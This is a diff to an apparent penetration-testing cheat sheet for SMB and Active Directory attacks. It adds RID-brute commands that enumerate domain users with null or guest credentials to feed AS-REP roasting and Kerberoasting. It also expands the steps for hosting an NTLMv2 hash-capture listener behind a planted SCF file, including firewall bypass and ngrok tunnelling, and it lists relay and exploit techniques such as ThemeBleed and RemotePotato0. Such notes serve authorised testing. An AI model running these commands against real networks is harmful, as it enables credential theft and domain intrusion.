@@ -28,6 +28,14 @@ smbclient //target/C$ -U Administrator -N
 # CrackMapExec
 crackmapexec smb target -u '' -p '' --shares
 
+# SAMR RID cycling — full domain user enumeration when null bind is denied but
+# `guest` (empty password) is enabled. Common on hardened DCs that lock anonymous
+# LDAP to root DSE only. SAMR over SMB returns every RID's name + group membership
+# even when no shares are readable.
+nxc smb <DC> -u guest -p '' --rid-brute 5000
+nxc smb <DC> -u '' -p '' --rid-brute 5000   # try null first; fall back to guest
+# When this works: feeds AS-REP roast / Kerberoast / web-app login lists for free.
+
 # NTLM relay
 ntlmrelayx.py -t target -smb2support
 ```
@@ -66,9 +74,19 @@ EOF
 
 # Host SMB listener to capture NTLMv2 hash
 smbserver.py -smb2support share ./
-# macOS gotcha: omit `-ip <addr>` and let it bind wildcard — `-ip <specific_VPN_IP>`
-# silently fails to bind 445 on Sequoia/Sonoma; the listener appears running but
-# inbound SMB connections get refused. Linux is unaffected.
+# macOS gotchas (Sequoia/Sonoma; Linux unaffected):
+# 1. `-ip <specific_VPN_IP>` silently fails to bind 445 — omit it (let it wildcard).
+# 2. Even with wildcard bind, the macOS Application Firewall + VPN routing combo
+#    drops INBOUND TCP/445 from the VPN tun for unsigned Python listeners. The
+#    listener shows `*:445 (LISTEN)` in lsof but `nc -w 3 <vpn_ip> 445` from
+#    another VPN host hangs. HTTP on 8000-9999 still works fine, only SMB on
+#    privileged ports is affected.
+# Fix options: (a) `sudo pfctl -d` (firewall down — requires sudo TTY),
+# (b) run smbserver inside a Linux Docker container with `--network host`
+# (Docker bypasses the macOS firewall), (c) tunnel via `ngrok tcp 445` /
+# `tmate` to expose a Linux relay's 445 to the VPN target.
+# This matters for SMB-required exploits: ThemeBleed (CVE-2023-38146),
+# RemotePotato0, NTLM-relay over SCF UNC pull, .lnk icon-pull capture.
 
 # Upload the SCF via the web app, wait for user to browse the share
 # Hash appears in smbserver output as NTLMv2-SSP
